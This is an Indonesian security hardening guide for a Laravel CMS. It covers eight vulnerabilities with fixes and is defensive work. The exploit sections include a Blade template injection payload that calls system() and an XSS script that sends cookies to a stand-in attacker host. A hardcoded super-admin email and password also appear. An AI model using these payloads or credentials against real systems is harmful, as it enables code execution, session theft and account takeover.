# Dokumentasi Hardening Keamanan — crafthink

Dokumen ini adalah panduan langkah demi langkah untuk menutup celah keamanan pada CMS `crafthink`.
Dikerjakan berurutan dari prioritas tertinggi. Setiap bagian berisi: **kenapa berbahaya**, **cara eksploitasi**, dan **langkah perbaikan konkret**.

Terakhir diperbarui: 2 Juli 2026
Basis analisis: Laravel 13 + Livewire + nwidart/laravel-modules + spatie/laravel-permission

---

## Skala Prioritas

| # | Celah | Tingkat | Dampak |
|---|-------|---------|--------|
| 1 | Injeksi kode lewat `label` di Module Generator | KRITIS | Remote Code Execution (RCE) |
| 2 | Stored XSS lewat `iframe_map` di halaman kontak | TINGGI | XSS ke semua pengunjung publik |
| 3 | Kredensial default super-admin di seeder | TINGGI | Pengambilalihan akun penuh |
| 4 | Registrasi publik terbuka menuju area admin | SEDANG | Perluasan permukaan serangan |
| 5 | Rich-editor merender konten tanpa sanitasi | SEDANG | Stored XSS antar-admin |
| 6 | `authorize()` selalu `true` di FormRequest | SEDANG | Hilangnya lapisan pertahanan |
| 7 | `APP_DEBUG=true` bocor ke produksi | SEDANG | Kebocoran informasi |
| 8 | Generator boleh jalan di produksi | SEDANG | Eksekusi shell di server live |

---

## 1. KRITIS — Injeksi kode lewat `label` di Module Generator

### Kenapa berbahaya
`ModuleGeneratorService` menulis nilai `label` dari input user **mentah** ke dalam file
`.blade.php` (index view baris ~522, form field baris ~708). File Blade yang dihasilkan
kemudian dikompilasi dan dijalankan oleh Laravel. Berbeda dari XSS biasa, ini menulis
ke **kode yang dieksekusi di server** → jalur menuju Remote Code Execution.

### Cara eksploitasi (contoh)
Field `name` sudah dilindungi regex snake_case, tapi `label` hanya `max:50` string bebas.
Penyerang (akun ber-permission `generator.create`) mengirim label:

```
Judul</label>{{ system('id') }}<label>
```

Nilai itu ikut tertulis ke view modul baru. Saat view dirender, `system('id')` dieksekusi
di server.

### Langkah perbaikan

**Langkah 1a** — Perketat validasi label di
`Modules/Generator/app/Http/Requests/GenerateModuleRequest.php`:

```php
// SEBELUM
'fields.*.label' => ['required', 'string', 'max:50'],

// SESUDAH — hanya huruf, angka, spasi, dan tanda baca aman
'fields.*.label' => ['required', 'string', 'max:50', 'regex:/^[\p{L}\p{N} .,()\-]+$/u'],
```

**Langkah 1b** — Escape label saat ditulis ke file (pertahanan berlapis).
Di `ModuleGeneratorService.php`, method `normalizeFields()`, escape label sebelum dipakai:

```php
private function normalizeFields(array $fields): array
{
    return array_values(array_map(fn ($f) => [
        'name'     => Str::snake(trim($f['name'])),
        'label'    => e(trim($f['label'])),   // <-- escape HTML entities
        'type'     => $f['type'],
        'nullable' => (bool) ($f['nullable'] ?? false),
    ], $fields));
}
```

> Catatan: `e()` mengubah `<`, `>`, `{`, `}` berbahaya menjadi entity, sehingga tidak
> bisa membentuk tag/sintaks Blade lagi.

**Langkah 1c** — Uji: coba generate modul dengan label mengandung `<` atau `{{`.
Setelah patch, request harus ditolak validasi ATAU tersimpan sebagai teks polos.

---

## 2. TINGGI — Stored XSS lewat `iframe_map`

### Kenapa berbahaya
`resources/views/kontak.blade.php` (baris ~110) merender `{!! $siteSetting->iframe_map !!}`
tanpa escape. Validasinya di FormRequest hanya `['nullable', 'string']`. Konten ini tampil
ke **setiap pengunjung publik** halaman kontak.

### Cara eksploitasi
Seseorang dengan akses SiteSetting menyimpan:
```html
<script>fetch('https://attacker/steal?c='+document.cookie)</script>
```
Skrip berjalan di browser semua pengunjung → pencurian sesi/cookie.

### Langkah perbaikan

**Opsi A (paling aman) — simpan URL saja, bangun iframe di server.**
Ubah field jadi hanya menerima URL embed yang di-whitelist:

```php
// di SiteSettingRequest rules()
'iframe_map' => ['nullable', 'url', 'max:500', 'starts_with:https://www.google.com/maps/embed'],
```

Lalu di blade, bangun tag-nya sendiri (bukan render mentah):

```blade
@if ($siteSetting->iframe_map)
    <iframe src="{{ $siteSetting->iframe_map }}"
            width="100%" height="400" style="border:0;"
            loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
@endif
```

**Opsi B (jika harus menerima tag `<iframe>` penuh)** — sanitasi dengan library,
mis. `mews/purifier`:

```bash
composer require mews/purifier
```
Konfigurasi profil yang hanya mengizinkan elemen `iframe` dari domain Google Maps,
lalu:
```blade
{!! clean($siteSetting->iframe_map, 'iframe_only') !!}
```

---

## 3. TINGGI — Kredensial default super-admin di seeder

### Kenapa berbahaya
`database/seeders/DatabaseSeeder.php` membuat akun `tiodwisatrio27@gmail.com`
berpassword `developer123`, dan role `developer` di-`syncPermissions(Permission::all())`
— artinya **seluruh permission sistem**. Kredensial ini terekspos di repo publik.
Jika seeder pernah dijalankan di server online, akun super-admin bisa langsung ditebak.

### Langkah perbaikan

**Langkah 3a** — Ambil kredensial dari environment, jangan hardcode:

```php
$user = User::firstOrCreate(
    ['email' => env('SEED_ADMIN_EMAIL', 'admin@example.test')],
    [
        'name'              => 'Administrator',
        'password'          => Hash::make(env('SEED_ADMIN_PASSWORD', Str::random(24))),
        'email_verified_at' => now(),
    ]
);
```

**Langkah 3b** — Tambah `SEED_ADMIN_EMAIL` dan `SEED_ADMIN_PASSWORD` ke `.env`
(bukan `.env.example`), dan pastikan `.env` ada di `.gitignore` (default Laravel sudah).

**Langkah 3c** — Jika CMS sudah pernah live: **segera** ganti password akun tersebut,
dan audit apakah ada login mencurigakan.

---

## 4. SEDANG — Registrasi publik terbuka menuju area admin

### Kenapa berbahaya
Route `register` aktif; komponen Volt langsung `Auth::login()` dan redirect ke
`route('dashboard')` yang hanya dijaga `middleware(['auth'])`. Siapa pun dari internet
bisa membuat akun dan masuk area `/admin`. Meski tiap CRUD dijaga permission, permukaan
serangan admin jadi terekspos + rawan pendaftaran bot massal.

### Langkah perbaikan

**Opsi A — matikan registrasi publik** (paling tepat untuk CMS internal).
Di `routes/auth.php`, hapus/komentari blok route `register` dan `login` store jika perlu:

```php
// Volt::route('register', 'pages.auth.register')->name('register');
```
Buat akun lewat modul User (yang sudah ada) atau seeder.

**Opsi B — jika registrasi tetap perlu**, pastikan user baru:
- tidak mendapat role apa pun secara otomatis (sudah demikian), dan
- diarahkan ke halaman non-admin, bukan `route('dashboard')`.

Ubah redirect di komponen register:
```php
$this->redirect(route('profile'), navigate: true); // bukan 'dashboard'
```

---

## 5. SEDANG — Rich-editor merender konten tanpa sanitasi

### Kenapa berbahaya
`resources/views/components/admin/rich-editor.blade.php` merender
`{!! old($name, $value) !!}`. Konten richtext (mis. isi Post, atau field richtext modul
hasil generator) disimpan dan ditampilkan tanpa sanitasi. Admin/editor yang jahat—atau
akun editor yang diretas—bisa menyisipkan `<script>` yang berjalan di sesi admin lain,
dan berpotensi di frontend jika konten dirender ke publik.

### Langkah perbaikan

Sanitasi HTML **saat menyimpan** (input), bukan hanya saat render. Dengan `mews/purifier`
(dari langkah 2B), bersihkan di Service sebelum `create/update`. Contoh di `PostService`:

```php
use Mews\Purifier\Facades\Purifier;

public function store(array $data, ?UploadedFile $image): Post
{
    $data['slug']    = Post::generateSlug($data['title']);
    $data['content'] = Purifier::clean($data['content'] ?? '');
    // ...
}
```
Terapkan pola yang sama pada `update()` dan pada modul lain yang punya field richtext.

---

## 6. SEDANG — `authorize()` selalu `true` di FormRequest

### Kenapa berbahaya
`StorePostRequest`, `StoreUserRequest`, `GenerateModuleRequest`, dsb. semua
`authorize(): bool { return true; }`. Saat ini otorisasi dipegang middleware
`permission:*` di controller — jadi belum fatal. Tapi jika suatu route dipakai ulang
tanpa middleware itu (mis. endpoint API baru), pintu terbuka lebar.

### Langkah perbaikan
Pindahkan cek permission ke `authorize()` agar FormRequest mandiri:

```php
// contoh StorePostRequest
public function authorize(): bool
{
    return $this->user()?->can('post.create') ?? false;
}
```
Lakukan untuk setiap request sesuai aksinya (`.create`, `.edit`, `.delete`).

---

## 7. SEDANG — `APP_DEBUG=true` berisiko bocor ke produksi

### Kenapa berbahaya
`.env.example` menyetel `APP_DEBUG=true` dan `APP_ENV=local`. Bila ikut ter-copy ke
produksi, stack trace lengkap + isi konfigurasi (kredensial DB, dll.) tampil ke penyerang
saat terjadi error.

### Langkah perbaikan
Pada server produksi, `.env` **wajib**:
```env
APP_ENV=production
APP_DEBUG=false
```
Lalu jalankan optimasi & cek:
```bash
php artisan config:cache
php artisan route:cache
php artisan optimize
```
Verifikasi: paksa error 500 di staging → harus tampil halaman error generik, bukan trace.

---

## 8. SEDANG — Generator boleh jalan di produksi

### Kenapa berbahaya
`ModuleGeneratorService` menjalankan proses shell (`composer dump-autoload`,
`module:migrate`, `pint`) dan menulis file. Menjalankan proses semacam ini di server
produksi live berisiko besar (race condition, korupsi autoload, beban server).

### Langkah perbaikan
Batasi generator hanya di environment non-produksi. Di `GeneratorController` atau di
awal `ModuleGeneratorService::generate()`:

```php
abort_unless(app()->environment(['local', 'staging']), 403, 'Generator dinonaktifkan di produksi.');
```
Alur yang benar: generate modul di lokal → commit hasilnya ke git → deploy ke produksi.

---

## Langkah Pengerasan Umum (checklist tambahan)

- [ ] `composer audit` dan `npm audit` rutin untuk cek dependency rentan.
- [ ] Pasto `APP_KEY` sudah di-set (`php artisan key:generate`) dan unik per environment.
- [ ] Aktifkan HTTPS + `SESSION_SECURE_COOKIE=true` di produksi.
- [ ] Tambah rate limiting pada route login (`throttle`) untuk cegah brute force.
- [ ] Set header keamanan (CSP, X-Frame-Options, X-Content-Type-Options) via middleware.
- [ ] Batasi upload: selain `image|max:2048`, validasi juga MIME sebenarnya & simpan di luar webroot bila memungkinkan.
- [ ] Backup DB terjadwal + uji restore.
- [ ] Tulis test untuk: enforcement permission tiap CRUD, dan khususnya generator (fitur paling berisiko justru belum ada test-nya).
- [ ] Log & monitor percobaan akses 403/401 yang tidak wajar.

---

## Urutan Eksekusi yang Disarankan

1. **Hari ini:** #1 (label generator), #2 (iframe), #3 (kredensial), #8 (kunci generator ke non-prod).
   Ini menutup jalur dari "pengunjung anonim / user biasa" menuju eksekusi kode atau akses admin.
2. **Minggu ini:** #4 (registrasi), #5 (rich-editor), #7 (debug produksi).
3. **Berkelanjutan:** #6 (authorize) + checklist umum + test.

Setelah semua langkah #1–#8 diterapkan dan diuji, permukaan serangan yang paling
berbahaya (RCE + stored XSS + akun default) sudah tertutup.
